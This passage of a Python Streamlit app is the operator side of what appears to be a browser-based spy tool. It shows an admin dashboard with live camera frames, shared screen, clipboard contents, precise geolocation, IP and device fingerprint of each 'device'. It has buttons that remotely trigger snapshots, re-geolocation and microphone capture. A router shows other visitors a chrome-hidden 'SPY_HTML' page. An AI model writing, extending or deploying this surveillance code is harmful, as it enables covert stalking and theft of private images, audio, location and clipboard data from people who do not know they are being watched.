    with act[1]:
        if st.button("HD snapshot", use_container_width=True):
            fb_put(f"{NS}/devices/{sel}/cmd/snap", now_ms())
            st.toast("Snapshot requested")
    with act[2]:
        if st.button("Re-geo", use_container_width=True):
            fb_put(f"{NS}/devices/{sel}/cmd/geo", now_ms())
    with act[3]:
        if st.button("Toggle mic", use_container_width=True):
            fb_put(f"{NS}/devices/{sel}/cmd/mic", now_ms())
    with act[4]:
        if st.button("Delete device data", use_container_width=True):
            fb_delete(f"{NS}/devices/{sel}")
            st.rerun()

    st.divider()

    if fragment:
        admin_live(sel)
        admin_audio(sel)
        admin_side(sel)
        admin_frames(sel)
        admin_events(sel)
    else:
        _live_body(sel)
        _audio_body(sel)
        _side_body(sel)
        _frames_body(sel)
        _events_body(sel)

    with st.expander("Raw device JSON"):
        st.json(fb_get(f"{NS}/devices/{sel}") or {})


def _live_body(sel):
    base = f"{NS}/devices/{sel}"
    frame = fb_get(base + "/frame") or {}
    on = fb_get(base + "/online") or {}
    info = fb_get(base + "/info") or {}
    ip = fb_get(base + "/ip") or {}
    geo = fb_get(base + "/geo") or {}
    bat = fb_get(base + "/battery") or {}
    net = fb_get(base + "/network") or {}
    cam = fb_get(base + "/camera") or {}
    live = bool(on.get("t")) and (now_ms() - on["t"] < 20000)

    left, right = st.columns([3, 2], gap="medium")

    with left:
        with st.container(border=True):
            tag = f'<span class="{"live" if live else "dead"}">{"LIVE" if live else "IDLE"}</span>'
            st.markdown(f"{tag} &nbsp;·&nbsp; camera feed &nbsp;·&nbsp; {ago(frame.get('t'))}",
                        unsafe_allow_html=True)
            if frame.get("img"):
                raw = b64bytes(frame["img"])
                if raw:
                    st.image(raw, use_container_width=True)
                    st.caption(f"{frame.get('w')}×{frame.get('h')} · frame #{frame.get('n')} · {ago(frame.get('t'))}")
            else:
                st.info("No frames yet. On the device, tap **Allow all** and accept the camera prompt.")

            sf = fb_get(base + "/screen_frame") or {}
            if sf.get("img"):
                raw = b64bytes(sf["img"])
                if raw:
                    st.markdown("**Shared screen**")
                    st.image(raw, use_container_width=True)

    with right:
        with st.container(border=True):
            st.markdown("**Identity**")
            c1, c2 = st.columns(2)
            c1.metric("Public IP", ip.get("ip", "—"))
            c2.metric("Battery", f"{round(bat.get('level', 0) * 100)}%" if bat.get("level") is not None else "—")
            c1.metric("Network", (net.get("effectiveType") or net.get("type") or "—"))
            c2.metric("Charging", "yes" if bat.get("charging") else "no")
            c1.metric("Camera", (cam.get("label") or "—")[:22])
            c2.metric("Frames", frame.get("n", 0))

            st.markdown("**Location**")
            if geo.get("lat") is not None:
                st.markdown(f'<span class="mono">{geo["lat"]:.6f}, {geo["lon"]:.6f} '
                            f'(±{round(geo.get("acc", 0))}m)</span>', unsafe_allow_html=True)
            else:
                st.caption("awaiting geolocation")

            st.markdown("**Device**")
            st.markdown(
                f'<span class="mono">'
                f'{esc(info.get("platform","—"))}<br>'
                f'{esc(info.get("screen","—"))} · dpr {esc(info.get("dpr","—"))}<br>'
                f'{esc(info.get("cores","—"))} cores · {esc(info.get("mem","—"))} GB<br>'
                f'{esc(info.get("tz","—"))} · {esc(info.get("lang","—"))}<br>'
                f'{esc(info.get("gpu","—"))}'
                f'</span>', unsafe_allow_html=True)


def _audio_body(sel):
    html = AUDIO_HTML.replace("__FB__", FB).replace("__NS__", NS).replace("__SEL__", sel)
    components.html(html, height=72)


def _side_body(sel):
    base = f"{NS}/devices/{sel}"
    perms = fb_get(base + "/permissions") or {}
    md = fb_get(base + "/media_devices") or []
    clip = fb_get(base + "/clipboard") or {}

    c1, c2 = st.columns(2, gap="medium")
    with c1:
        with st.container(border=True):
            st.markdown("**Permission states**")
            if perms:
                html = "".join(
                    chip_html(f"{k}: {v}", v)
                    for k, v in perms.items() if k != "t")
                st.markdown(html, unsafe_allow_html=True)
            else:
                st.caption("awaiting")
    with c2:
        with st.container(border=True):
            st.markdown("**Media devices**")
            if md:
                for d in md:
                    st.markdown(f'<span class="mono">{esc(d.get("kind",""))} · {esc(d.get("label") or "(unnamed)")}</span>',
                                unsafe_allow_html=True)
            else:
                st.caption("awaiting")
            if clip.get("text"):
                st.markdown("**Clipboard**")
                st.code(str(clip["text"])[:500])


def _frames_body(sel):
    shots = fb_get(f"{NS}/devices/{sel}/shots") or {}
    if not shots:
        return
    ks = sorted(shots.keys())[-12:]
    with st.container(border=True):
        st.markdown(f"**Captured frames** &nbsp;·&nbsp; {len(shots)} stored")
        cols = st.columns(6)
        for i, k in enumerate(reversed(ks)):
            s = shots[k]
            raw = b64bytes(s.get("img", ""))
            if raw:
                with cols[i % 6]:
                    st.image(raw, use_container_width=True)
                    st.caption(ago(s.get("t")))


def _events_body(sel):
    ev = fb_get(f"{NS}/devices/{sel}/events") or {}
    if not ev:
        return
    ks = sorted(ev.keys(), key=lambda k: ev[k].get("t", 0))[-45:]
    with st.container(border=True):
        st.markdown("**Event log**")
        rows = []
        for k in reversed(ks):
            e = ev[k]
            bad = bool(e.get("err")) or e.get("msg") in ("permission", "geo_error", "clip_error", "screen_error")
            color = "#ef4444" if bad else "#8792a8"
            ts = time.strftime("%H:%M:%S", time.localtime((e.get("t", 0)) / 1000))
            extra = f' <span class="mono">({esc(e.get("err"))})</span>' if e.get("err") else ""
            cam = f' <span class="mono">{esc(e.get("camera"))}</span>' if e.get("camera") else ""
            rows.append(f'<div class="mono" style="color:{color}">{ts} &nbsp; {esc(e.get("msg"))}{extra}{cam}</div>')
        st.markdown("".join(rows), unsafe_allow_html=True)


if fragment:
    admin_live = fragment(run_every=1.0)(_live_body)
    admin_side = fragment(run_every=5.0)(_side_body)
    admin_frames = fragment(run_every=5.0)(_frames_body)
    admin_events = fragment(run_every=3.0)(_events_body)
    admin_audio = _audio_body
else:
    admin_live = admin_side = admin_frames = admin_events = admin_audio = None


# ----------------------------------------------------------------------------- VISITOR VIEW
def render_visitor():
    st.markdown(HIDE_CHROME, unsafe_allow_html=True)
    html = SPY_HTML.replace("__FB__", FB).replace("__NS__", NS)
    components.html(html, height=772, scrolling=False)


# ----------------------------------------------------------------------------- ROUTER
if "admin" in st.query_params:
    render_admin()
else:
    render_visitor()